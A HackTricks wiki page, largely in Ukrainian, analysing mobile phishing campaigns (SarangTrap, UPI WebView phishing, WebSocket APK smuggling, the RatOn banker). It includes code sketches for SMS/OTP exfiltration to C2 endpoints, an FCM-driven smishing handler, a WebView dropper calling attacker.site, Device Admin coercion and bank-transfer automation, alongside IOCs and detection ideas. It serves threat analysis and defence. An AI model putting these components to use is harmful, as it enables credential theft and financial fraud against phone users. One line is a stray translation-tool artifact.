# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Ця сторінка описує техніки, які використовують threat actors для поширення **malicious Android APKs** та **iOS mobile-configuration profiles** через phishing (SEO, social engineering, fake stores, dating apps тощо).
> Матеріал адаптовано з кампанії SarangTrap, розкритої Zimperium zLabs (2025), та інших публічних досліджень.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Реєстрація десятків look-alike доменів (dating, cloud share, car service…).
– Використання ключових слів рідною мовою та emojis у елементі `<title>`, щоб підвищити ранжування в Google.
– Розміщення інструкцій по встановленню для *both* Android (`.apk`) та iOS на одній landing page.
2. **First Stage Download**
* Android: пряме посилання на *unsigned* або “third-party store” APK.
* iOS: `itms-services://` або звичайне HTTPS-посилання на шкідливий **mobileconfig** profile (див. нижче).
3. **Post-install Social Engineering**
* Під час першого запуску app запитує **invitation / verification code** (ілюзія ексклюзивного доступу).
* Код відправляється як POST over HTTP до Command-and-Control (C2).
* C2 відповідає `{"success":true}` ➜ malware продовжує роботу.
* Sandbox / AV dynamic analysis, яка ніколи не надсилає валідний код, не бачить **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Небезпечні permissions запитуються лише **після позитивної відповіді C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Останні варіанти **видаляють `<uses-permission>` для SMS з `AndroidManifest.xml`**, але залишають Java/Kotlin код, що читає SMS через reflection ⇒ це знижує static score, але залишається функціональним на пристроях, де permission надано через `AppOps` abuse або в старих цілях.
5. **Facade UI & Background Collection**
* App показує нешкідливі view (SMS viewer, gallery picker), реалізовані локально.
* Тим часом виконується exfiltration:
- IMEI / IMSI, phone number
- Повний dump `ContactsContract` (JSON array)
- JPEG/PNG з `/sdcard/DCIM`, стиснуті за допомогою [Luban](https://github.com/Curzibn/Luban) для зменшення розміру
- Опціонально вміст SMS (`content://sms`)
Payloads пакетуються в batch-zip і відправляються через `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* Один **mobile-configuration profile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб записати пристрій у “MDM”-подібний supervision.
* Інструкції соціальної інженерії:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* три рази (скріншоти на phishing page).
3. Trust the unsigned profile ➜ attacker отримує entitlements для *Contacts* & *Photo* без App Store review.
7. **Network Layer**
* Plain HTTP, часто на порті 80 з HOST header типу `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → легко виявити).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – Під час оцінки malware автоматизуйте фазу invitation code за допомогою Frida/Objection, щоб дістатися до шкідливої гілки.
* **Manifest vs. Runtime Diff** – Порівняйте `aapt dump permissions` з runtime `PackageManager#getRequestedPermissions()`; відсутність небезпечних perms — червоний прапорець.
* **Network Canary** – Налаштуйте `iptables -p tcp --dport 80 -j NFQUEUE` для виявлення незвичних POST-потоків після введення коду.
* **mobileconfig Inspection** – Використовуйте `security cms -D -i profile.mobileconfig` на macOS, щоб перелічити `PayloadContent` і виявити надмірні entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** для виявлення раптових хвиль доменів, багатих на ключові слова.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` від Dalvik клієнтів поза Google Play.
* **Invite-code Telemetry** – POST 6–8 цифрних numeric codes незабаром після встановлення APK може вказувати на стадію staging.
* **MobileConfig Signing** – Блокувати unsigned configuration profiles через політику MDM.

## Useful Frida Snippet: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Індикатори (Загальні)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Цей патерн спостерігався в кампаніях, що зловживають темами державних виплат для викрадення Indian UPI credentials та OTP. Оператори ланцюжать авторитетні платформи для доставки та підвищення стійкості.

### Delivery chain across trusted platforms
- YouTube відео-приманка → в описі міститься коротке посилання
- Коротке посилання → GitHub Pages фішинговий сайт, що імітує легітимний портал
- Той самий GitHub repo хостить APK з підробним “Google Play” бейджем, що веде безпосередньо до файлу
- Динамічні фішингові сторінки живуть на Replit; канал віддалених команд використовує Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Перший APK — інсталятор (dropper), який доставляє реальний malware у `assets/app.apk` і підказує користувачу вимкнути Wi‑Fi/мобільні дані, щоб зменшити ефективність хмарного виявлення.
- Вбудований payload встановлюється під нешкідливою назвою (наприклад, “Secure Update”). Після інсталяції і інсталятор, і payload присутні як окремі додатки.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне визначення кінцевих точок через shortlink
- Malware витягує список активних кінцевих точок у вигляді простого тексту, розділеного комами, з shortlink; прості перетворення рядків створюють фінальний шлях до phishing-сторінки.

Приклад (санітизований):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Крок «Make payment of ₹1 / UPI‑Lite» завантажує шкідливу HTML-форму атакуючого з динамічного endpoint всередині WebView і перехоплює конфіденційні поля (телефон, банк, UPI PIN), які потім передаються через `POST` у `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- На першому запуску запитуються агресивні дозволи:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти перебираються в циклі для масової розсилки smishing SMS з пристрою жертви.
- Вхідні SMS перехоплюються broadcast receiver і завантажуються з метаданими (відправник, текст повідомлення, слот SIM, унікальний для пристрою випадковий ID) на `/addsm.php`.

Ескіз приймача:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- payload реєструється в FCM; push-повідомлення містять поле `_type`, яке використовується як перемикач для запуску дій (наприклад, оновлення текстових шаблонів phishing, перемикання поведінкових режимів).

Приклад FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Ескіз обробника:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Hunting patterns and IOCs
- APK містить вторинний payload в `assets/app.apk`
- WebView завантажує payment з `gate.htm` і exfiltrates до `/addup.php`
- SMS exfiltration до `/addsm.php`
- Запит конфігурації через shortlink (наприклад, `rebrand.ly/*`), який повертає CSV endpoints
- Додатки, позначені як generic “Update/Secure Update”
- FCM `data` повідомлення з дискримінатором `_type` в ненадійних додатках

### Detection & defence ideas
- Позначати додатки, які інструктують користувачів вимкнути мережу під час інсталяції, а потім side-load другий APK з `assets/`.
- Сповіщати про кортеж дозволів: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` разом з платіжними потоками на базі WebView.
- Моніторинг вихідного трафіку для `POST /addup.php|/addsm.php` на некорпоративних хостах; блокувати відому інфраструктуру.
- Правила Mobile EDR: ненадійний додаток, що реєструється для FCM і робить розгалуження за полем `_type`.

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Зловмисники все частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у підроблені лендінги, що нагадують Google Play. Це приховує payload URL, обходить URL/extension filters, і зберігає реалістичний install UX.

Типовий клієнтський потік, зафіксований у реальних операціях:
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
Чому це обходить прості контрзаходи:
- Не розкривається статичний APK URL; payload реконструюється в пам'яті з WebSocket frames.
- Фільтри URL/MIME/розширень, які блокують прямі .apk відповіді, можуть не помітити бінарні дані, тунельовані через WebSockets/Socket.IO.
- Crawlers і URL-sandboxes, які не виконують WebSockets, не зможуть отримати payload.

Ідеї для пошуку та виявлення:
- Web/мережева телеметрія: позначайте WebSocket-сесії, що передають великі бінарні чанки, після яких створюється Blob з MIME application/vnd.android.package-archive і програмний клік по `<a download>`. Шукайте клієнтські рядки на кшталт socket.emit('startDownload'), а також події з іменами chunk, downloadProgress, downloadComplete у скриптах сторінки.
- Play-store spoof heuristics: на не-Google доменах, що віддають сторінки, схожі на Play, шукайте Google Play UI рядки, такі як http.html:"VfPpkd-jY41G-V67aGc", змішаномовні шаблони та фейкові потоки «verification/progress», керовані WS подіями.
- Контрзаходи: блокувати доставку APK з не-Google джерел; застосовувати політики MIME/розширень, які охоплюють WebSocket-трафік; зберігати безпечні підказки завантаження браузера.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay та Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Кампанія RatOn banker/RAT (ThreatFabric) — конкретний приклад того, як сучасні mobile phishing операції поєднують WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover і навіть NFC-relay orchestration. Цей розділ абстрагує багаторазово використовувані техніки.

### Stage-1: WebView → native install bridge (dropper)
Атакувальники показують WebView, що вказує на сторінку нападника, і інжектять JavaScript інтерфейс, який виставляє native installer. Дотик по HTML-кнопці викликає native код, який встановлює second-stage APK, упакований в assets dropper’а, і потім запускає його напряму.

Мінімальний патерн:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Будь ласка, надайте HTML або текст сторінки (вміст файлу) для перекладу — нічого не можна перекласти без самого вмісту.
```html
<button onclick="bridge.installApk()">Install</button>
```
Після встановлення dropper запускає payload через explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ідея для виявлення: ненадійні програми, що викликають `addJavascriptInterface()` і відкривають для WebView методи, схожі на інсталятор; APK, який постачає вбудований вторинний payload під `assets/` і викликає Package Installer Session API.

### Фільтр згоди: Accessibility + Device Admin + подальні runtime запити
На другому етапі відкривається WebView, який містить сторінку «Access». Її кнопка викликає експортований метод, що переводить жертву в налаштування Accessibility і просить увімкнути шкідливий сервіс. Після надання дозволу malware використовує Accessibility, щоб автоматично натискати через наступні діалоги runtime-дозволів (contacts, overlay, manage system settings тощо) і запитує Device Admin.

- Accessibility програмно допомагає приймати наступні запити, знаходячи кнопки типу “Allow”/“OK” в дереві вузлів і ініціюючи кліки.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Див. також:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Оверлей phishing/ransom через WebView
Оператори можуть надсилати команди для:
- відтворити повноекранний оверлей з URL, або
- передати inline HTML, яке завантажується в WebView-оверлей.

Ймовірні сценарії використання: coercion (введення PIN), відкриття wallet для перехоплення PINів, ransom messaging. Наявна команда має перевіряти та забезпечувати дозвіл на overlay, якщо він відсутній.

### Модель віддаленого керування – текстовий псевдо-екран + screen-cast
- Low-bandwidth: періодично робити дамп Accessibility node tree, серіалізувати видимі тексти/roles/bounds і відправляти на C2 як псевдо-екран (команди на кшталт `txt_screen` — одноразова і `screen_live` — безперервна).
- High-fidelity: запитувати MediaProjection і за потреби починати screen-casting/recording (команди на кшталт `display` / `record`).

### ATS playbook (bank app automation)
За заданим JSON-завданням відкрити банківський додаток, керувати UI через Accessibility за допомогою поєднання текстових запитів і координатних тапів, і ввести платіжний PIN жертви при запиті.

Приклад завдання:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Оператори також можуть перевіряти/підвищувати ліміти переказів через команди на кшталт `check_limit` і `limit`, які аналогічно працюють з інтерфейсом лімітів.

### Витягнення seed phrase крипто-гаманця
Цілі типу MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Примус через Device Admin
Device Admin APIs використовуються для збільшення можливостей PIN-capture та для ускладнення дій жертви:

- Негайне блокування:
```java
dpm.lockNow();
```
- Завершити термін дії поточних облікових даних, щоб примусити зміну (Accessibility фіксує новий PIN/пароль):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Примусово перейти на розблокування без біометрії, вимкнувши біометричні функції keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Always validate on target OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. This enables contactless card-present cash-out alongside online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Hunt for WebViews with `addJavascriptInterface()` exposing installer/permission methods; pages ending in “/access” that trigger Accessibility prompts.
- Alert on apps that generate high-rate Accessibility gestures/clicks shortly after being granted service access; telemetry that resembles Accessibility node dumps sent to C2.
- Monitor Device Admin policy changes in untrusted apps: `lockNow`, password expiration, keyguard feature toggles.
- Alert on MediaProjection prompts from non-corporate apps followed by periodic frame uploads.
- Detect installation/launch of an external NFC-relay app triggered by another app.
- For banking: enforce out-of-band confirmations, biometrics-binding, and transaction-limits resistant to on-device automation.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
